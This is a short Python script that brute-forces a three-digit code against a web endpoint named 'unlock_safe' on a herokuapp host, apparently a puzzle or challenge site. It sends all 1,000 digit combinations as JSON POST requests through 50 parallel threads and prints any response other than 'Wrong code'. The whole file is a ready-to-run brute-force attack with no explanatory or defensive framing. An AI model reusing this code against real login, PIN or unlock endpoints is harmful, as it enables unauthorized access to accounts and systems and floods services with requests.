import time
from concurrent.futures import ThreadPoolExecutor
from functools import wraps
import json
import requests
from tqdm import tqdm


def timeit(method):
    @wraps(method)
    def wrapper(*args, **kwargs):
        start_time = time.time()
        result = method(*args, **kwargs)
        end_time = time.time()
        # print(f"{method.__name__} => {(end_time-start_time)*1000} ms")

        return result

    return wrapper


def attack_one(url, code):
    payload = {"first": code[0], "second": code[1], "third": code[2]}
    payload = json.dumps(payload)
    headers = {"Content-Type": "application/json",}
    response = requests.request("POST", url, headers=headers, data=payload)
    if response.text != 'Wrong code':
        print("\n\n\n--------------------------------------------\n\n\n")
        print(response.text)
        print("\n\n\n--------------------------------------------\n\n\n")



@timeit
def attack_all(urls, codes):
    with ThreadPoolExecutor(max_workers=50) as executor:
        results = list(
            tqdm(executor.map(attack_one, urls, codes, timeout=260), total=len(urls))
        )
        return results


if __name__ == "__main__":
    url = "https://qcvault.herokuapp.com/unlock_safe"
    urls = [url] * 1000
    codes = []
    for i in range(0, 10):
        for j in range(0, 10):
            for k in range(0, 10):
                codes.append([i, j, k])

    results = attack_all(urls, codes)